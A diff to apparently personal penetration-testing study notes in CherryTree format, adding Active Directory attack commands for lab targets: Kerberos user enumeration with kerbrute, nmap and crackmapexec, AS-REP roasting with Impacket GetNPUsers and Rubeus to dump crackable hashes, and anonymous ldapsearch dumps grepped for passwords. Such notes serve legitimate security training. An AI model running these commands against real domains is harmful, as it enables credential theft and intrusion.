@@ -1250,7 +1250,7 @@ _____________________________________
         <codebox char_offset="108" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">chmod 600 ~/.ssh/authorized_keys</codebox>
         <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -L 8000:127.0.0.1:8000 sau@10.11.1.</codebox>
       </node>
-      <node name="nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687617619" ts_lastsave="1687617725">
+      <node name="nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687617619" ts_lastsave="1687805895">
         <rich_text scale="h2">Usage
 </rich_text>
         <rich_text>
@@ -1265,7 +1265,7 @@ _____________________________________
 
 </rich_text>
         <rich_text justification="left"></rich_text>
-        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. -output niktooutput.log</codebox>
+        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. | tee output.log</codebox>
         <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. -port [port number 1], [port number 2], [port number 3]</codebox>
       </node>
       <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1687690153">
@@ -1337,7 +1337,7 @@ Also check
         <codebox char_offset="242" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.11.1.</codebox>
         <codebox char_offset="249" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.11.1.</codebox>
       </node>
-      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1687690428">
+      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1687808714">
         <rich_text>
 
 
@@ -1358,6 +1358,82 @@ Also check
         <rich_text>
 </rich_text>
         <rich_text link="webs https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce">https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce</rich_text>
+        <node name="88 Kerberos Auth" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1687814576">
+          <rich_text scale="h1">Kerberos Authentication:</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+____________________________________________________________________________________
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <codebox char_offset="25" justification="left" frame_width="1970" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+# make sure u add the domain to the ip in host file
+kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100 
+
+or
+_______________________________________________________________________
+
+## once u have list of users from ldap search or somewhere else
+
+./kerbrute_linux_amd64 userenum -d hutch.offsec --dc 10.11.1. usernames.txt
+
+
+____________________________________________________________________________________
+
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" 10.11.1.
+Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='&lt;domain&gt;',userdb=/root/Desktop/usernames.txt 10.11.1.
+
+____________________________________________________________________________________
+
+
+msf&gt; use auxiliary/gather/kerberos_enumusers
+
+____________________________________________________________________________________
+
+
+crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</codebox>
+          <codebox char_offset="114" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0"></codebox>
+          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1687808763">
+            <rich_text scale="h1">Request AS_REP message</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text scale="h3">Using Impacket</rich_text>
+            <rich_text>
+
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+
+or
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+
+</rich_text>
+            <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#Try all the usernames in usernames.txt
+python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+#Use domain creds to extract targets and target them
+python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+
+or
+
+impacket-GetNPUsers spookysec.local/svc-admin -no-pass
+
+
+or
+
+python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 10.11.1.
+</codebox>
+            <codebox char_offset="48" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
+Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)</codebox>
+          </node>
+        </node>
         <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1687690728">
           <node name="GetNPUsers-ASRreproasting" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690744">
             <rich_text scale="h1">Request AS_REP message</rich_text>
@@ -1723,13 +1799,38 @@ where -c is for collection all</rich_text>
           <codebox char_offset="616" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.11.1. -d support.htb -u ‘ldap’ -p ‘password’</codebox>
           <codebox char_offset="681" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.11.1. -d support.htb -u ‘ldap’ -p ‘password’ -c all</codebox>
         </node>
-        <node name="ldapsearch" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690428" ts_lastsave="1687690429">
+        <node name="ldapsearch" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690428" ts_lastsave="1687814865">
           <rich_text scale="h3">Using Ldapsearch</rich_text>
           <rich_text>
 
 </rich_text>
           <rich_text justification="left"></rich_text>
-          <codebox char_offset="18" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -h support.htb -D ‘ldap@support.htb’ -w 'password -b 'dc=support,dc=htb'</codebox>
+          <rich_text>
+
+or 
+
+Without any user:
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+once u have the output make sure u check log file for 
+
+1.  </rich_text>
+          <rich_text weight="heavy">Passwords</rich_text>
+          <rich_text> via :
+   
+2.  </rich_text>
+          <rich_text weight="heavy">Usernames</rich_text>
+          <rich_text> Via:
+   
+</rich_text>
+          <codebox char_offset="18" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -h support.htb -D ‘ldap@support.htb’ -w 'password' -b 'dc=support,dc=htb'</codebox>
+          <codebox char_offset="45" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://10.11.1. | tee ldapSearch.log  </codebox>
+          <codebox char_offset="128" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat ldapSearch.log| grep -i password</codebox>
+          <codebox char_offset="152" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep 'sAMAccountName:' ldapSearch.log</codebox>
         </node>
       </node>
       <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
